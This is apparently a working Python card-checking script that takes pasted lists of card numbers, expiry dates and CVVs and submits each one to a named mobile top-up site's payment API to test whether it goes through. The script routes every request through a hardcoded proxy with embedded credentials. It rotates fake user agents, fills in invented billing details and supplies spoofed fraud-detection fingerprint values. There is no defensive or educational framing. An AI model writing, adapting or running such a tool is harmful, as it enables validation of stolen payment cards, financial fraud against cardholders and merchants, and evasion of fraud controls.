import requests
import uuid
import time
from fake_useragent import UserAgent

PROXY = "http://nslqdeey:jhmrvnto65s1@107.172.163.27:6543"
BASE_URL = "https://www.etopuponline.com"
ua = UserAgent()

def get_cards_from_terminal():
    print("Paste or type cards in format cc|mm|yy|cvv, one per line. When done, press Enter on a blank line.")
    cards = []
    while True:
        try:
            line = input().strip()
        except EOFError:
            break
        if not line:
            break
        if '|' in line and len(line.split('|')) == 4:
            cards.append(line)
        else:
            print("Invalid format. Use cc|mm|yy|cvv")
    return cards

def get_mobile_number():
    while True:
        number = input("Enter the mobile number to use: ").strip()
        if number.isdigit() and 8 <= len(number) <= 13:
            return number
        print("Enter a valid mobile number.")

def get_params():
    return {
        'version': '2.5',
        'requestSource': '1657',
        '__t': str(int(time.time() * 1000)),
        'language': 'en',
    }

headers_template = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json;charset=UTF-8',
    'dnt': '1',
    'origin': BASE_URL,
    'priority': 'u=1, i',
    'referer': f'{BASE_URL}/topup/index',
    'sec-ch-ua': '"Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
}

def get_fresh_session_and_headers():
    session = requests.Session()
    user_agent = ua.random
    headers = headers_template.copy()
    headers['user-agent'] = user_agent
    try:
        session.get(
            BASE_URL,
            headers={"user-agent": user_agent},
            proxies={"http": PROXY, "https": PROXY},
            timeout=15,
        )
    except Exception:
        pass
    return session, headers

def start_session(session, headers, mobile_number):
    session_id = str(uuid.uuid4())
    data = {
        "countryCode": "IN",
        "mobileNumber": mobile_number,
        "skuId": 3047,
        "guestEmail": "fornowho@gmail.com",
        "sourceCurrencyCode": "USD",
        "sessionId": session_id,
        "sms": None,
        "coverSalesTax": False,
        "promoCode": None,
        "rewardPointsUsed": 0,
        "productCategory": 0,
        "senderMobile": None,
        "senderFullName": None,
        "recipientMobile": None,
        "recipientEmail": None,
        "recipientFullName": None,
        "recipientMessage": None,
    }
    try:
        session.post(
            f"{BASE_URL}/api/trx/save-session2",
            params=get_params(),
            headers=headers,
            json=data,
            proxies={"http": PROXY, "https": PROXY},
            timeout=30
        )
    except Exception:
        pass
    return session_id

def hit_card(session, card, sessionid, headers):
    cc, mm, yy, cvv = card.split('|')
    cc_info = {
        "storeCc": True,
        "country": "US",
        "creditCardNumber": cc,
        "expiryMonthyear": f"{mm} / {yy}",
        "cvvCode": cvv,
        "lastName": "lucky oh",
        "streetAddress": "new york",
        "city": "new york",
        "state": "NY",
        "zipCode": "10080",
        "creditCardToken": cc,
    }
    data = {
        "sessionid": sessionid,
        "ccInfo": cc_info,
        "fingerPrintSessions": {
            "Riskified": sessionid,
            "Vesta": "141_262_1004459867",
        },
        "userBrowserInfo": {
            "screenHeight": 823,
            "screenColorDepth": 24,
            "screenWidth": 1463,
            "timezone": -330,
            "language": "en-US",
            "isJavaEnabled": False,
        },
    }
    try:
        resp = session.post(
            f"{BASE_URL}/api/trx/post-cc-transaction",
            params=get_params(),
            headers=headers,
            json=data,
            proxies={"http": PROXY, "https": PROXY},
            timeout=30
        )
        try:
            js = resp.json()
            msg = js.get("responseMessage") or js.get("message") or "Unknown"
            return msg
        except Exception:
            return "No valid JSON reply"
    except Exception as e:
        return f"REQUEST ERROR: {e}"

if __name__ == "__main__":
    cards = get_cards_from_terminal()
    mobile_number = get_mobile_number()
    for card in cards:
        session, headers = get_fresh_session_and_headers()
        sessionid = start_session(session, headers, mobile_number)
        result = hit_card(session, card, sessionid, headers)
        print(f"{card} => {result}")
        time.sleep(2)

